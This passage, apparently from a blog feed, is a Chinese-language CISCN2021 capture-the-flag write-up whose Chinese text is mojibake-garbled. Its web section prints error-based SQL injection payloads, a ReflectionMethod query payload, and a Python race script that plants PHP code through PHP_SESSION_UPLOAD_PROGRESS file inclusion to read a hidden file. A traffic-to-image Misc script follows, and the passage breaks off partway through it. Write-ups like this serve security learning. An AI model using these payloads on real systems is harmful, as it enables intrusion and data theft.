å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å„ä¸ªå‡½æ•°&quot;&gt;&lt;a href=&quot;#å„ä¸ªå‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;å„ä¸ªå‡½æ•°&quot;&gt;&lt;/a&gt;å„ä¸ªå‡½æ•°&lt;/h2&gt;&lt;h3 id=&quot;intval&quot;&gt;&lt;a href=&quot;#intval&quot; class=&quot;headerlink&quot; title=&quot;intva</summary>
      
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/tags/Web/"/>
    
    <category term="PHP" scheme="https://lucifer-rossweisse.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021éƒ¨åˆ†WriteUp</title>
    <link href="https://lucifer-rossweisse.github.io/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/"/>
    <id>https://lucifer-rossweisse.github.io/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2021-05-20T12:39:51.000Z</published>
    <updated>2021-07-23T03:27:46.485Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>ç”¨æ— åˆ—åæŠ¥é”™æ³¨å…¥ï¼ŒçŒœæµ‹æœ‰flagè¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) || updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(no, id))c),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>å¯ä»¥çˆ†å‡ºæœ€åè¿˜æœ‰ä¸€ä¸ª<code>7ba99583-2ac3-40df-ac62-109330206d66</code>åˆ—åã€‚</p><p>ç›´æ¥æ‹¿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) || updatexml(1,concat(0x7e,(select &#96;7ba99583-2ac3-40df-ac62-109330206d66&#96; from flag),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>å­˜åœ¨å¤‡ä»½æ–‡ä»¶<code>.index.php.swo</code>ã€‚</p><p>å¾—åˆ°å¯æ§æ–°å»ºç±»å’Œç±»æ–¹æ³•ã€‚</p><p>ç„¶ååˆ©ç”¨phpå†…ç½®çš„<code>ReflectionMethod</code>ç±»è¯»å–<code>user</code>ç±»ä¸­çš„æ¯ä¸ªå‡½æ•°çš„æ³¨é‡Šã€‚</p><p>payloadåœ¨è¿™</p><blockquote><p>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</p></blockquote><p>ç„¶åæ”¹rbåˆ†åˆ«æŸ¥çœ‹å…¶ä»–å‡½æ•°å°±è¡Œäº†ï¼Œçˆ†å‡ºflagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/bsj14ZtSuUXdHhK.png"></p><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your flag is in some file in /etc &quot;</span>;</span><br><span class="line">    <span class="variable">$fielf</span>=<span class="variable">$_POST</span>[<span class="string">&quot;field&quot;</span>];</span><br><span class="line">    <span class="variable">$cf</span>=<span class="string">&quot;/tmp/app_auth/cfile/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;cf&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$cf</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$cf</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$field</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> your flag is in some file in /etc</span><br></pre></td></tr></table></figure><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>æ‰«æå¯ä»¥æ‰«å‡ºæ¥ä¸€ä¸ª<code>.listing</code>ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª<code>you_can_seeeeeeee_me.php</code>ï¼Œæ‰“å¼€å‘ç°æ˜¯phpinfoçš„å†…å®¹ï¼Œä½†æ˜¯disable_functionç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ã€‚</p><h4 id="PHP-SESSION-UPLOAD-PROGRESSæ–‡ä»¶åŒ…å«"><a href="#PHP-SESSION-UPLOAD-PROGRESSæ–‡ä»¶åŒ…å«" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESSæ–‡ä»¶åŒ…å«"></a>PHP_SESSION_UPLOAD_PROGRESSæ–‡ä»¶åŒ…å«</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œç„¶åç«äº‰è¿›è¡Œrceï¼Œ<a href="https://www.freebuf.com/vuls/202819.html">åŸç†åœ¨è¿™</a>ã€‚</p><p>å†™ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sid = <span class="string">&#x27;a18&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/eaheaeebeb/sess_<span class="subst">&#123;sid&#125;</span>&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;url_here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">SESS</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = SESS.post(url,</span><br><span class="line">                         data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/jhfhabcabi/ghdbcffecc/fffbeacjdg/hfjjaaaabg/fciaaaeehc/fl444444g&quot;));?&gt;&#x27;</span>,</span><br><span class="line">                               &#125;,</span><br><span class="line">                         files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.txt&#x27;</span>, f)&#125;,</span><br><span class="line">                         cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">SESS</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = SESS.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>tips: POSTå¿…é¡»è¦åŠ fileså‚æ•°è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸ç„¶sessionçš„ä¸´æ—¶æ–‡ä»¶æ˜¯ä¸ä¼šç”Ÿæˆçš„ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p>æŸ¥çœ‹æµé‡åŒ…å¯ä»¥å‘ç°ç±»ä¼¼åæ ‡ç‚¹çš„æ•°å€¼ï¼Œå…¨éƒ¨æå–å‡ºæ¥ç„¶åç”¨è„šæœ¬ç”Ÿæˆåƒç´ å›¾å³å¯å¾—åˆ°å­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">XYlocation = [[<span class="number">27</span>, <span class="number">36</span>], [<span class="number">28</span>, <span class="number">35</span>], [<span class="number">29</span>, <span class="number">35</span>], [<span class="number">31</span>, <span class="number">35</span>], [<span class="number">32</span>, <span class="number">35</span>], [<span class="number">33</span>, <span class="number">35</span>], [<span class="number">35</span>, <span class="number">35</span>], [<span class="number">36</span>, <span class="number">35</span>], [<span class="number">37</span>, <span class="number">35</span>], [<span class="number">39</span>, <span class="number">34</span>],</span><br><span class="line">               [<span class="number">40</span>, <span class="number">34</span>], [<span class="number">41</span>, <span class="number">33</span>], [<span class="number">42</span>, <span class="number">32</span>], [<span class="number">43</span>, <span class="number">32</span>], [<span class="number">45</span>, <span class="number">32</span>], [<span class="number">47</span>, <span class="number">31</span>], [<span class="number">48</span>, <span class="number">29</span>], [<span class="number">49</span>, <span class="number">28</span>], [<span class="number">49</span>, <span class="number">27</span>], [<span class="number">50</span>, <span class="number">26</span>],</span><br><span class="line">               [<span class="number">50</span>, <span class="number">25</span>], [<span class="number">51</span>, <span class="number">23</span>], [<span class="number">51</span>, <span class="number">22</span>], [<span class="number">51</span>, <span class="number">21</span>], [<span class="number">52</span>, <span class="number">20</span>], [<span class="number">52</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">18</span>], [<span class="number">52</span>, <span class="number">17</span>], [<span class="number">52</span>, <span class="number">16</span>], [<span class="number">52</span>, <span class="number">15</span>],</span><br><span class="line">               [<span class="number">51</span>, <span class="number">14</span>], [<span class="number">50</span>, <span class="number">14</span>], [<span class="number">49</span>, <span class="number">14</span>], [<span class="number">48</span>, <span class="number">14</span>], [<span class="number">47</span>, <span class="number">14</span>], [<span class="number">46</span>, <span class="number">14</span>], [<span class="number">45</span>, <span class="number">14</span>], [<span class="number">44</span>, <span class="number">14</span>], [<span class="number">43</span>, <span class="number">14</span>], [<span class="number">42</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">40</span>, <span class="number">14</span>], [<span class="number">39</span>, <span class="number">14</span>], [<span class="number">37</span>, <span class="number">14</span>], [<span class="number">35</span>, <span class="number">14</span>], [<span class="number">34</span>, <span class="number">14</span>], [<span class="number">32</span>, <span class="number">14</span>], [<span class="number">30</span>, <span class="number">14</span>], [<span class="number">28</span>, <span class="number">14</span>], [<span class="number">27</span>, <span class="number">14</span>], [<span class="number">26</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">25</span>, <span class="number">14</span>], [<span class="number">24</span>, <span class="number">14</span>], [<span class="number">23</span>, <span class="number">14</span>], [<span class="number">22</span>, <span class="number">14</span>], [<span class="number">21</span>, <span class="number">15</span>], [<span class="number">20</span>, <span class="number">16</span>], [<span class="number">19</span>, <span class="number">17</span>], [<span class="number">18</span>, <span class="number">19</span>], [<span class="number">18</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">               [<span class="number">18</span>, <span class="number">23</span>], [<span class="number">18</span>, <span class="number">24</span>], [<span class="number">18</span>, <span class="number">26</span>], [<span class="number">18</span>, <span class="number">27</span>], [<span class="number">18</span>, <span class="number">28</span>], [<span class="number">18</span>, <span class="number">30</span>], [<span class="number">18</span>, <span class="number">32</span>], [<span class="number">18</span>, <span class="number">33</span>], [<span class="number">18</span>, <span class="number">34</span>], [<span class="number">19</span>, <span class="number">37</span>],</span><br><span class="line">               [<span class="number">21</span>, <span class="number">39</span>], [<span class="number">21</span>, <span class="number">40</span>], [<span class="number">22</span>, <span class="number">42</span>], [<span class="number">24</span>, <span class="number">44</span>], [<span class="number">24</span>, <span class="number">45</span>], [<span class="number">26</span>, <span class="number">47</span>], [<span class="number">27</span>, <span class="number">48</span>], [<span class="number">28</span>, <span class="number">49</span>], [<span class="number">29</span>, <span class="number">50</span>], [<span class="number">30</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">31</span>, <span class="number">52</span>], [<span class="number">33</span>, <span class="number">53</span>], [<span class="number">34</span>, <span class="number">53</span>], [<span class="number">35</span>, <span class="number">54</span>], [<span class="number">36</span>, <span class="number">54</span>], [<span class="number">37</span>, <span class="number">54</span>], [<span class="number">38</span>, <span class="number">54</span>], [<span class="number">39</span>, <span class="number">54</span>], [<span class="number">40</span>, <span class="number">54</span>], [<span class="number">41</span>, <span class="number">54</span>],</span><br><span class="line">               [<span class="number">44</span>, <span class="number">54</span>], [<span class="number">46</span>, <span class="number">54</span>], [<span class="number">48</span>, <span class="number">54</span>], [<span class="number">50</span>, <span class="number">54</span>], [<span class="number">52</span>, <span class="number">53</span>], [<span class="number">53</span>, <span class="number">53</span>], [<span class="number">54</span>, <span class="number">52</span>], [<span class="number">55</span>, <span class="number">52</span>], [<span class="number">56</span>, <span class="number">52</span>], [<span class="number">58</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">59</span>, <span class="number">50</span>], [<span class="number">61</span>, <span class="number">49</span>], [<span class="number">62</span>, <span class="number">49</span>], [<span class="number">64</span>, <span class="number">47</span>], [<span class="number">65</span>, <span class="number">47</span>], [<span class="number">67</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">46</span>], [<span class="number">70</span>, <span class="number">45</span>], [<span class="number">71</span>, <span class="number">44</span>], [<span class="number">125</span>, <span class="number">23</span>],</span><br><span class="line">               [<span class="number">125</span>, <span class="number">23</span>], [<span class="number">124</span>, <span class="number">22</span>], [<span class="number">123</span>, <span class="number">22</span>], [<span class="number">121</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">20</span>], [<span class="number">115</span>, <span class="number">19</span>], [<span class="number">113</span>, <span class="number">19</span>], [<span class="number">112</span>, <span class="number">18</span>], [<span class="number">111</span>, <span class="number">18</span>],</span><br><span class="line">               [<span class="number">109</span>, <span class="number">17</span>], [<span class="number">106</span>, <span class="number">16</span>], [<span class="number">104</span>, <span class="number">16</span>], [<span class="number">103</span>, <span class="number">16</span>], [<span class="number">102</span>, <span class="number">15</span>], [<span class="number">101</span>, <span class="number">15</span>], [<span class="number">100</span>, <span class="number">15</span>], [<span class="number">99</span>, <span class="number">15</span>], [<span class="number">98</span>, <span class="number">15</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">15</span>], [<span class="number">96</span>, <span class="number">15</span>], [<span class="number">95</span>, <span class="number">15</span>], [<span class="number">94</span>, <span class="number">15</span>], [<span class="number">93</span>, <span class="number">15</span>], [<span class="number">92</span>, <span class="number">15</span>], [<span class="number">91</span>, <span class="number">15</span>], [<span class="number">89</span>, <span class="number">15</span>], [<span class="number">87</span>, <span class="number">17</span>], [<span class="number">85</span>, <span class="number">18</span>],</span><br><span class="line">               [<span class="number">85</span>, <span class="number">19</span>], [<span class="number">84</span>, <span class="number">21</span>], [<span class="number">83</span>, <span class="number">21</span>], [<span class="number">82</span>, <span class="number">22</span>], [<span class="number">82</span>, <span class="number">23</span>], [<span class="number">81</span>, <span class="number">24</span>], [<span class="number">81</span>, <span class="number">26</span>], [<span class="number">80</span>, <span class="number">28</span>], [<span class="number">80</span>, <span class="number">29</span>], [<span class="number">80</span>, <span class="number">31</span>],</span><br><span class="line">               [<span class="number">80</span>, <span class="number">32</span>], [<span class="number">79</span>, <span class="number">34</span>], [<span class="number">79</span>, <span class="number">35</span>], [<span class="number">79</span>, <span class="number">37</span>], [<span class="number">79</span>, <span class="number">39</span>], [<span class="number">79</span>, <span class="number">41</span>], [<span class="number">79</span>, <span class="number">43</span>], [<span class="number">79</span>, <span class="number">44</span>], [<span class="number">79</span>, <span class="number">46</span>], [<span class="number">79</span>, <span class="number">47</span>],</span><br><span class="line">               [<span class="number">80</span>, <span class="number">48</span>], [<span class="number">81</span>, <span class="number">49</span>], [<span class="number">82</span>, <span class="number">50</span>], [<span class="number">84</span>, <span class="number">50</span>], [<span class="number">87</span>, <span class="number">51</span>], [<span class="number">88</span>, <span class="number">51</span>], [<span class="number">90</span>, <span class="number">51</span>], [<span class="number">91</span>, <span class="number">51</span>], [<span class="number">93</span>, <span class="number">51</span>], [<span class="number">94</span>, <span class="number">51</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">51</span>], [<span class="number">100</span>, <span class="number">50</span>], [<span class="number">101</span>, <span class="number">49</span>], [<span class="number">102</span>, <span class="number">49</span>], [<span class="number">103</span>, <span class="number">48</span>], [<span class="number">105</span>, <span class="number">46</span>], [<span class="number">106</span>, <span class="number">45</span>], [<span class="number">108</span>, <span class="number">43</span>], [<span class="number">109</span>, <span class="number">42</span>],</span><br><span class="line">               [<span class="number">110</span>, <span class="number">41</span>], [<span class="number">111</span>, <span class="number">39</span>], [<span class="number">112</span>, <span class="number">38</span>], [<span class="number">112</span>, <span class="number">36</span>], [<span class="number">113</span>, <span class="number">34</span>], [<span class="number">114</span>, <span class="number">33</span>], [<span class="number">115</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">31</span>], [<span class="number">116</span>, <span class="number">30</span>],</span><br><span class="line">               [<span class="number">117</span>, <span class="number">28</span>], [<span class="number">118</span>, <span class="number">27</span>], [<span class="number">118</span>, <span class="number">28</span>], [<span class="number">117</span>, <span class="number">30</span>], [<span class="number">116</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">34</span>], [<span class="number">115</span>, <span class="number">36</span>], [<span class="number">114</span>, <span class="number">39</span>], [<span class="number">114</span>, <span class="number">41</span>],</span><br><span class="line">               [<span class="number">114</span>, <span class="number">43</span>], [<span class="number">114</span>, <span class="number">45</span>], [<span class="number">114</span>, <span class="number">47</span>], [<span class="number">114</span>, <span class="number">48</span>], [<span class="number">114</span>, <span class="number">50</span>], [<span class="number">114</span>, <span class="number">52</span>], [<span class="number">114</span>, <span class="number">53</span>], [<span class="number">115</span>, <span class="number">54</span>], [<span class="number">116</span>, <span class="number">55</span>],</span><br><span class="line">               [<span class="number">117</span>, <span class="number">56</span>], [<span class="number">118</span>, <span class="number">57</span>], [<span class="number">120</span>, <span class="number">57</span>], [<span class="number">122</span>, <span class="number">57</span>], [<span class="number">124</span>, <span class="number">57</span>], [<span class="number">126</span>, <span class="number">57</span>], [<span class="number">128</span>, <span class="number">57</span>], [<span class="number">131</span>, <span class="number">57</span>], [<span class="number">133</span>, <span class="number">57</span>],</span><br><span class="line">               [<span class="number">136</span>, <span class="number">57</span>], [<span class="number">138</span>, <span class="number">57</span>], [<span class="number">141</span>, <span class="number">57</span>], [<span class="number">143</span>, <span class="number">56</span>], [<span class="number">145</span>, <span class="number">55</span>], [<span class="number">147</span>, <span class="number">53</span>], [<span class="number">149</span>, <span class="number">52</span>], [<span class="number">150</span>, <span class="number">52</span>], [<span class="number">152</span>, <span class="number">50</span>],</span><br><span class="line">               [<span class="number">153</span>, <span class="number">49</span>], [<span class="number">155</span>, <span class="number">47</span>], [<span class="number">156</span>, <span class="number">46</span>], [<span class="number">157</span>, <span class="number">45</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">213</span>, <span class="number">23</span>], [<span class="number">211</span>, <span class="number">21</span>], [<span class="number">210</span>, <span class="number">20</span>],</span><br><span class="line">               [<span class="number">209</span>, <span class="number">19</span>], [<span class="number">208</span>, <span class="number">18</span>], [<span class="number">207</span>, <span class="number">17</span>], [<span class="number">206</span>, <span class="number">16</span>], [<span class="number">205</span>, <span class="number">15</span>], [<span class="number">204</span>, <span class="number">15</span>], [<span class="number">201</span>, <span class="number">14</span>], [<span class="number">200</span>, <span class="number">14</span>], [<span class="number">199</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">197</span>, <span class="number">14</span>], [<span class="number">196</span>, <span class="number">14</span>], [<span class="number">195</span>, <span class="number">14</span>], [<span class="number">193</span>, <span class="number">14</span>], [<span class="number">191</span>, <span class="number">14</span>], [<span class="number">189</span>, <span class="number">16</span>], [<span class="number">188</span>, <span class="number">16</span>], [<span class="number">187</span>, <span class="number">16</span>], [<span class="number">186</span>, <span class="number">17</span>],</span><br><span class="line">               [<span class="number">185</span>, <span class="number">17</span>], [<span class="number">183</span>, <span class="number">18</span>], [<span class="number">183</span>, <span class="number">20</span>], [<span class="number">183</span>, <span class="number">21</span>], [<span class="number">182</span>, <span class="number">22</span>], [<span class="number">182</span>, <span class="number">23</span>], [<span class="number">182</span>, <span class="number">24</span>], [<span class="number">182</span>, <span class="number">25</span>], [<span class="number">182</span>, <span class="number">26</span>],</span><br><span class="line">               [<span class="number">182</span>, <span class="number">27</span>], [<span class="number">182</span>, <span class="number">29</span>], [<span class="number">183</span>, <span class="number">31</span>], [<span class="number">184</span>, <span class="number">32</span>], [<span class="number">186</span>, <span class="number">33</span>], [<span class="number">187</span>, <span class="number">34</span>], [<span class="number">188</span>, <span class="number">34</span>], [<span class="number">189</span>, <span class="number">35</span>], [<span class="number">190</span>, <span class="number">35</span>],</span><br><span class="line">               [<span class="number">192</span>, <span class="number">36</span>], [<span class="number">194</span>, <span class="number">37</span>], [<span class="number">196</span>, <span class="number">37</span>], [<span class="number">198</span>, <span class="number">38</span>], [<span class="number">199</span>, <span class="number">38</span>], [<span class="number">200</span>, <span class="number">38</span>], [<span class="number">201</span>, <span class="number">38</span>], [<span class="number">202</span>, <span class="number">39</span>], [<span class="number">203</span>, <span class="number">39</span>],</span><br><span class="line">               [<span class="number">204</span>, <span class="number">40</span>], [<span class="number">207</span>, <span class="number">41</span>], [<span class="number">207</span>, <span class="number">42</span>], [<span class="number">208</span>, <span class="number">43</span>], [<span class="number">208</span>, <span class="number">44</span>], [<span class="number">208</span>, <span class="number">45</span>], [<span class="number">208</span>, <span class="number">46</span>], [<span class="number">208</span>, <span class="number">48</span>], [<span class="number">208</span>, <span class="number">50</span>],</span><br><span class="line">               [<span class="number">208</span>, <span class="number">51</span>], [<span class="number">207</span>, <span class="number">53</span>], [<span class="number">207</span>, <span class="number">54</span>], [<span class="number">206</span>, <span class="number">56</span>], [<span class="number">204</span>, <span class="number">58</span>], [<span class="number">203</span>, <span class="number">60</span>], [<span class="number">202</span>, <span class="number">61</span>], [<span class="number">201</span>, <span class="number">62</span>], [<span class="number">201</span>, <span class="number">63</span>],</span><br><span class="line">               [<span class="number">200</span>, <span class="number">64</span>], [<span class="number">199</span>, <span class="number">64</span>], [<span class="number">198</span>, <span class="number">64</span>], [<span class="number">197</span>, <span class="number">65</span>], [<span class="number">196</span>, <span class="number">65</span>], [<span class="number">195</span>, <span class="number">65</span>], [<span class="number">193</span>, <span class="number">65</span>], [<span class="number">192</span>, <span class="number">65</span>], [<span class="number">190</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">189</span>, <span class="number">65</span>], [<span class="number">187</span>, <span class="number">65</span>], [<span class="number">185</span>, <span class="number">65</span>], [<span class="number">184</span>, <span class="number">65</span>], [<span class="number">183</span>, <span class="number">65</span>], [<span class="number">181</span>, <span class="number">64</span>], [<span class="number">180</span>, <span class="number">63</span>], [<span class="number">179</span>, <span class="number">63</span>], [<span class="number">178</span>, <span class="number">62</span>],</span><br><span class="line">               [<span class="number">177</span>, <span class="number">62</span>], [<span class="number">175</span>, <span class="number">61</span>], [<span class="number">174</span>, <span class="number">60</span>], [<span class="number">173</span>, <span class="number">59</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">244</span>, <span class="number">19</span>], [<span class="number">244</span>, <span class="number">21</span>], [<span class="number">244</span>, <span class="number">25</span>],</span><br><span class="line">               [<span class="number">245</span>, <span class="number">26</span>], [<span class="number">245</span>, <span class="number">29</span>], [<span class="number">247</span>, <span class="number">32</span>], [<span class="number">247</span>, <span class="number">34</span>], [<span class="number">248</span>, <span class="number">36</span>], [<span class="number">248</span>, <span class="number">37</span>], [<span class="number">249</span>, <span class="number">39</span>], [<span class="number">250</span>, <span class="number">40</span>], [<span class="number">251</span>, <span class="number">42</span>],</span><br><span class="line">               [<span class="number">251</span>, <span class="number">43</span>], [<span class="number">252</span>, <span class="number">44</span>], [<span class="number">254</span>, <span class="number">44</span>], [<span class="number">256</span>, <span class="number">44</span>], [<span class="number">258</span>, <span class="number">44</span>], [<span class="number">260</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">41</span>], [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">265</span>, <span class="number">38</span>],</span><br><span class="line">               [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">267</span>, <span class="number">32</span>], [<span class="number">268</span>, <span class="number">30</span>], [<span class="number">271</span>, <span class="number">27</span>], [<span class="number">272</span>, <span class="number">25</span>], [<span class="number">273</span>, <span class="number">22</span>], [<span class="number">274</span>, <span class="number">21</span>], [<span class="number">275</span>, <span class="number">20</span>], [<span class="number">275</span>, <span class="number">19</span>],</span><br><span class="line">               [<span class="number">274</span>, <span class="number">18</span>], 